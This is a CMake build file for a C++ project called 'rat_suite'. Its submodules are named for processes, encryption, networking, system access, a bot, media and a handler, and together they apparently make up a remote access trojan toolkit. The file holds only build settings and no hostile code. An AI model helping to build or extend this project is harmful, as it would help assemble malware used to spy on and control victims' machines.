cmake_minimum_required(VERSION 3.25)
project(rat_suite LANGUAGES CXX)

set(CC clang++)
set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)

set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin)
set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/lib)
# === Options ===
option(STATIC "Build static libraries" ON)
option(DEBUG "Enable debug logging" OFF)

# === Dependencies ===

# fmt
find_package(fmt REQUIRED)

# curl
find_package(CURL REQUIRED)

# spdlog
if(DEBUG)
    find_package(spdlog REQUIRED)
    message(STATUS "Debug mode enabled: adding -g -O0")

    # Add flags for all targets
    add_compile_options(-Wall -Werror -Wpedantic -g -O0)
else()
    add_compile_options(-Ofast -O2)
endif()


# === Submodules ===
add_subdirectory(rat_process)
add_subdirectory(rat_encryption)
add_subdirectory(rat_networking)
add_subdirectory(rat_threading)
add_subdirectory(rat_system)
add_subdirectory(rat_tbot)
add_subdirectory(rat_media)
add_subdirectory(rat_handler)
add_subdirectory(rat_trat)

